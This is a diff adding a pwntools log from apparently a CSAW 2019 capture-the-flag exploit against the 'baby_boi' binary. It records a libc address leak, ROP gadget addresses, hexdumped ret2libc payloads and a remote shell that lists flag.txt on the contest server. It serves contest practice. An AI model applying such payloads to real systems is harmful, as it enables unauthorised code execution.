@@ -1,0 +1,320 @@
+================================================================================
+= Started at 2019-09-14T14:39:59                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:39:59                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:39:59:INFO:pwnlib.tubes.process.process.140460925540752:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
+2019-09-14T14:39:59:INFO:pwnlib.tubes.process.process.140460925540752:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi': pid 6910
+2019-09-14T14:39:59:DEBUG:pwnlib.tubes.process.process.140460925540752:Received 0x21 bytes:
+2019-09-14T14:39:59:DEBUG:pwnlib.tubes.process.process.140460925540752:'Hello!\n'
+2019-09-14T14:39:59:DEBUG:pwnlib.tubes.process.process.140460925540752:'Here I am: 0x7f2762f62e80\n'
+2019-09-14T14:39:59:INFO:pwnlib.exploit:printf at: 0x7f2762f62e80
+2019-09-14T14:39:59:INFO:pwnlib.exploit:libc base: 0x7f2762efe000
+2019-09-14T14:39:59:INFO:pwnlib.exploit:system: 0x7f2762f4d440
+2019-09-14T14:39:59:INFO:pwnlib.exploit:/bin/sh: 0x7f27630b1e9a
+2019-09-14T14:39:59:INFO:pwnlib.exploit:pop rdi: 0x7f2762f1f55f
+2019-09-14T14:39:59:DEBUG:pwnlib.tubes.process.process.140460925540752:Sent 0x41 bytes:
+2019-09-14T14:39:59:DEBUG:pwnlib.tubes.process.process.140460925540752:00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA[90m│[mAAAA[90m│[mAAAA[90m│[mAAAA│
+*
+00000020  41 41 41 41  41 41 41 41  5f [90mf5[m [90mf1[m 62  27 [90m7f[m [31m00[m [31m00[m  │AAAA[90m│[mAAAA[90m│[m_[90m·[m[90m·[mb[90m│[m'[90m·[m[31m·[m[31m·[m│
+00000030  [90m9a[m [90m1e[m [90m0b[m 63  27 [90m7f[m [31m00[m [31m00[m  40 [90md4[m [90mf4[m 62  27 [90m7f[m [31m00[m [31m00[m  │[90m·[m[90m·[m[90m·[mc[90m│[m'[90m·[m[31m·[m[31m·[m[90m│[m@[90m·[m[90m·[mb[90m│[m'[90m·[m[31m·[m[31m·[m│
+00000040  [31m0a[m                                                  │[31m·[m│
+00000041
+2019-09-14T14:39:59:INFO:pwnlib.tubes.process.process.140460925540752:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T14:39:59                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:39:59:INFO:pwnlib.tubes.process.process.140460925540752:Got EOF while reading in interactive
+2019-09-14T14:40:00:DEBUG:pwnlib.tubes.process.process.140460925540752:Sent 0x1 bytes:
+2019-09-14T14:40:00:INFO:pwnlib.tubes.process.process.140460925540752:'\n' * 0x1
+2019-09-14T14:40:00:INFO:pwnlib.tubes.process.process.140460925540752:Process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi' stopped with exit code -11 (SIGSEGV) (pid 6910)
+2019-09-14T14:40:00:INFO:pwnlib.tubes.process.process.140460925540752:Got EOF while sending in interactive
+================================================================================
+= Started at 2019-09-14T14:40:00                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:43:34                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:43:34                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:43:34:INFO:pwnlib.tubes.process.process.140010730819536:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
+2019-09-14T14:43:34:INFO:pwnlib.tubes.process.process.140010730819536:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi': pid 6944
+2019-09-14T14:43:34:INFO:pwnlib.exploit:printf at: 0x7fea3802ce80
+2019-09-14T14:43:34:INFO:pwnlib.exploit:libc base: 0x7fea37fc8000
+2019-09-14T14:43:34:INFO:pwnlib.exploit:system: 0x7fea38017440
+2019-09-14T14:43:34:INFO:pwnlib.exploit:/bin/sh: 0x7fea3817be9a
+2019-09-14T14:43:34:INFO:pwnlib.exploit:pop rdi: 0x7fea37fe955f
+2019-09-14T14:43:34:INFO:pwnlib.tubes.process.process.140010730819536:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T14:43:34                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:43:34:INFO:pwnlib.tubes.process.process.140010730819536:Got EOF while reading in interactive
+2019-09-14T14:43:35:INFO:pwnlib.tubes.process.process.140010730819536:Process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi' stopped with exit code -11 (SIGSEGV) (pid 6944)
+2019-09-14T14:43:35:INFO:pwnlib.tubes.process.process.140010730819536:Got EOF while sending in interactive
+================================================================================
+= Started at 2019-09-14T14:43:35                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:44:57                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+=   ':',                                                                       =
+=   'cat',                                                                     =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:44:57                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+=   ':',                                                                       =
+=   'cat',                                                                     =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:44:57:INFO:pwnlib.tubes.process.process.140415798022096:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
+2019-09-14T14:44:57:INFO:pwnlib.tubes.process.process.140415798022096:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi': pid 6961
+2019-09-14T14:44:57:INFO:pwnlib.exploit:printf at: 0x7ff4cecf5e80
+2019-09-14T14:44:57:INFO:pwnlib.exploit:libc base: 0x7ff4cec91000
+2019-09-14T14:44:57:INFO:pwnlib.exploit:system: 0x7ff4cece0440
+2019-09-14T14:44:57:INFO:pwnlib.exploit:/bin/sh: 0x7ff4cee44e9a
+2019-09-14T14:44:57:INFO:pwnlib.exploit:pop rdi: 0x7ff4cecb255f
+================================================================================
+= Started at 2019-09-14T14:44:57                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+=   ':',                                                                       =
+=   'cat',                                                                     =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:44:57:INFO:pwnlib.tubes.process.process.140415798022096:Stopped process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi' (pid 6961)
+================================================================================
+= Started at 2019-09-14T14:45:00                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:45:00                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:00:INFO:pwnlib.tubes.process.process.140210715226064:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
+2019-09-14T14:45:00:INFO:pwnlib.tubes.process.process.140210715226064:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi': pid 6973
+2019-09-14T14:45:00:INFO:pwnlib.exploit:printf at: 0x7f7c66bd2e80
+2019-09-14T14:45:00:INFO:pwnlib.exploit:libc base: 0x7f7c66b6e000
+2019-09-14T14:45:00:INFO:pwnlib.exploit:system: 0x7f7c66bbd440
+2019-09-14T14:45:00:INFO:pwnlib.exploit:/bin/sh: 0x7f7c66d21e9a
+2019-09-14T14:45:00:INFO:pwnlib.exploit:pop rdi: 0x7f7c66b8f55f
+================================================================================
+= Started at 2019-09-14T14:45:00                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:00:INFO:pwnlib.tubes.process.process.140210715226064:Stopped process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi' (pid 6973)
+================================================================================
+= Started at 2019-09-14T14:45:33                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:45:33                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:33:INFO:pwnlib.tubes.process.process.139971670646736:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi'
+2019-09-14T14:45:33:INFO:pwnlib.tubes.process.process.139971670646736:Starting local process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi': pid 6986
+2019-09-14T14:45:33:INFO:pwnlib.exploit:printf at: 0x7f8927304e80
+2019-09-14T14:45:33:INFO:pwnlib.exploit:libc base: 0x7f89272a0000
+2019-09-14T14:45:33:INFO:pwnlib.exploit:system: 0x7f89272ef440
+2019-09-14T14:45:33:INFO:pwnlib.exploit:/bin/sh: 0x7f8927453e9a
+2019-09-14T14:45:33:INFO:pwnlib.exploit:pop rdi: 0x7f89272c155f
+2019-09-14T14:45:33:INFO:pwnlib.tubes.process.process.139971670646736:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T14:45:33                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:35:INFO:pwnlib.tubes.process.process.139971670646736:Interrupted
+================================================================================
+= Started at 2019-09-14T14:45:35                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:35:INFO:pwnlib.tubes.process.process.139971670646736:Stopped process '/ctf/pwn-and-rev/csaw-2019-quals/pwn/baby_boi/baby_boi' (pid 6986)
+================================================================================
+= Started at 2019-09-14T14:45:45                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T14:45:45                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:45:INFO:pwnlib.tubes.remote.remote.139844669788112:Opening connection to pwn.chal.csaw.io on port 1005
+2019-09-14T14:45:45:INFO:pwnlib.tubes.remote.remote.139844669788112:Opening connection to pwn.chal.csaw.io on port 1005: Trying 216.165.2.59
+2019-09-14T14:45:46:INFO:pwnlib.tubes.remote.remote.139844669788112:Opening connection to pwn.chal.csaw.io on port 1005: Done
+2019-09-14T14:45:46:INFO:pwnlib.exploit:printf at: 0x7f2da92a4e80
+2019-09-14T14:45:46:INFO:pwnlib.exploit:libc base: 0x7f2da9240000
+2019-09-14T14:45:46:INFO:pwnlib.exploit:system: 0x7f2da928f440
+2019-09-14T14:45:46:INFO:pwnlib.exploit:/bin/sh: 0x7f2da93f3e9a
+2019-09-14T14:45:46:INFO:pwnlib.exploit:pop rdi: 0x7f2da926155f
+2019-09-14T14:45:46:INFO:pwnlib.tubes.remote.remote.139844669788112:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T14:45:46                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:50:INFO:pwnlib.tubes.remote.remote.139844669788112:Interrupted
+================================================================================
+= Started at 2019-09-14T14:45:50                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T14:45:50:INFO:pwnlib.tubes.remote.remote.139844669788112:Closed connection to pwn.chal.csaw.io port 1005
+================================================================================
+= Started at 2019-09-14T23:17:47                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T23:17:47                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:17:47:INFO:pwnlib.tubes.remote.remote.140678284348240:Opening connection to pwn.chal.csaw.io on port 1005
+2019-09-14T23:17:47:INFO:pwnlib.tubes.remote.remote.140678284348240:Opening connection to pwn.chal.csaw.io on port 1005: Trying 216.165.2.59
+2019-09-14T23:17:50:INFO:pwnlib.tubes.remote.remote.140678284348240:Opening connection to pwn.chal.csaw.io on port 1005: Done
+2019-09-14T23:17:50:DEBUG:pwnlib.tubes.remote.remote.140678284348240:Received 0x21 bytes:
+2019-09-14T23:17:50:DEBUG:pwnlib.tubes.remote.remote.140678284348240:'Hello!\n'
+2019-09-14T23:17:50:DEBUG:pwnlib.tubes.remote.remote.140678284348240:'Here I am: 0x7f319836ae80\n'
+2019-09-14T23:17:50:INFO:pwnlib.exploit:printf at: 0x7f319836ae80
+2019-09-14T23:17:50:INFO:pwnlib.exploit:libc base: 0x7f3198306000
+2019-09-14T23:17:50:INFO:pwnlib.exploit:system: 0x7f3198355440
+2019-09-14T23:17:50:INFO:pwnlib.exploit:/bin/sh: 0x7f31984b9e9a
+2019-09-14T23:17:50:INFO:pwnlib.exploit:pop rdi: 0x7f319832755f
+2019-09-14T23:17:50:DEBUG:pwnlib.tubes.remote.remote.140678284348240:Sent 0x59 bytes:
+2019-09-14T23:17:50:DEBUG:pwnlib.tubes.remote.remote.140678284348240:00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA[90m│[mAAAA[90m│[mAAAA[90m│[mAAAA│
+*
+00000020  41 41 41 41  41 41 41 41  5f 75 32 [90m98[m  31 [90m7f[m [31m00[m [31m00[m  │AAAA[90m│[mAAAA[90m│[m_u2[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m│
+00000030  [90m9a[m [90m9e[m 4b [90m98[m  31 [90m7f[m [31m00[m [31m00[m  40 54 35 [90m98[m  31 [90m7f[m [31m00[m [31m00[m  │[90m·[m[90m·[mK[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m[90m│[m@T5[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m│
+00000040  5f 75 32 [90m98[m  31 [90m7f[m [31m00[m [31m00[m  [90m9a[m [90m9e[m 4b [90m98[m  31 [90m7f[m [31m00[m [31m00[m  │_u2[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m[90m│[m[90m·[m[90m·[mK[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m│
+00000050  40 54 35 [90m98[m  31 [90m7f[m [31m00[m [31m00[m  [31m0a[m                        │@T5[90m·[m[90m│[m1[90m·[m[31m·[m[31m·[m[90m│[m[31m·[m│
+00000059
+2019-09-14T23:17:50:INFO:pwnlib.tubes.remote.remote.140678284348240:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T23:17:50                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:17:51:DEBUG:pwnlib.tubes.remote.remote.140678284348240:Sent 0x3 bytes:
+2019-09-14T23:17:51:DEBUG:pwnlib.tubes.remote.remote.140678284348240:'ls\n'
+2019-09-14T23:17:51:DEBUG:pwnlib.tubes.remote.remote.140678284348240:Received 0x12 bytes:
+2019-09-14T23:17:51:DEBUG:pwnlib.tubes.remote.remote.140678284348240:'baby_boi\n'
+2019-09-14T23:17:51:DEBUG:pwnlib.tubes.remote.remote.140678284348240:'flag.txt\n'
+2019-09-14T23:17:51:INFO:pwnlib.tubes.remote.remote.140678284348240:Interrupted
+================================================================================
+= Started at 2019-09-14T23:17:51                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:17:51:INFO:pwnlib.tubes.remote.remote.140678284348240:Closed connection to pwn.chal.csaw.io port 1005
+================================================================================
+= Started at 2019-09-14T23:18:28                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T23:18:28                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:18:28:INFO:pwnlib.tubes.remote.remote.140370061273936:Opening connection to pwn.chal.csaw.io on port 1005
+2019-09-14T23:18:28:INFO:pwnlib.tubes.remote.remote.140370061273936:Opening connection to pwn.chal.csaw.io on port 1005: Trying 216.165.2.59
+2019-09-14T23:18:28:INFO:pwnlib.tubes.remote.remote.140370061273936:Opening connection to pwn.chal.csaw.io on port 1005: Done
+2019-09-14T23:18:28:DEBUG:pwnlib.tubes.remote.remote.140370061273936:Received 0x21 bytes:
+2019-09-14T23:18:28:DEBUG:pwnlib.tubes.remote.remote.140370061273936:'Hello!\n'
+2019-09-14T23:18:28:DEBUG:pwnlib.tubes.remote.remote.140370061273936:'Here I am: 0x7f2f7ca38e80\n'
+================================================================================
+= Started at 2019-09-14T23:18:28                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:18:28:INFO:pwnlib.tubes.remote.remote.140370061273936:Closed connection to pwn.chal.csaw.io port 1005
+================================================================================
+= Started at 2019-09-14T23:18:42                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+================================================================================
+= Started at 2019-09-14T23:18:42                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:18:42:INFO:pwnlib.tubes.remote.remote.139923157433104:Opening connection to pwn.chal.csaw.io on port 1005
+2019-09-14T23:18:42:INFO:pwnlib.tubes.remote.remote.139923157433104:Opening connection to pwn.chal.csaw.io on port 1005: Trying 216.165.2.59
+2019-09-14T23:18:42:INFO:pwnlib.tubes.remote.remote.139923157433104:Opening connection to pwn.chal.csaw.io on port 1005: Done
+2019-09-14T23:18:42:INFO:pwnlib.exploit:printf at: 0x7f30c15a1e80
+2019-09-14T23:18:42:INFO:pwnlib.exploit:libc base: 0x7f30c153d000
+2019-09-14T23:18:42:INFO:pwnlib.exploit:system: 0x7f30c158c440
+2019-09-14T23:18:42:INFO:pwnlib.exploit:/bin/sh: 0x7f30c16f0e9a
+2019-09-14T23:18:42:INFO:pwnlib.exploit:pop rdi: 0x7f30c155e55f
+2019-09-14T23:18:42:INFO:pwnlib.tubes.remote.remote.139923157433104:Switching to interactive mode
+================================================================================
+= Started at 2019-09-14T23:18:42                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:18:44:INFO:pwnlib.tubes.remote.remote.139923157433104:Interrupted
+================================================================================
+= Started at 2019-09-14T23:18:44                                               =
+= sys.argv = [                                                                 =
+=   './exploit.py',                                                            =
+= ]                                                                            =
+================================================================================
+2019-09-14T23:18:44:INFO:pwnlib.tubes.remote.remote.139923157433104:Closed connection to pwn.chal.csaw.io port 1005
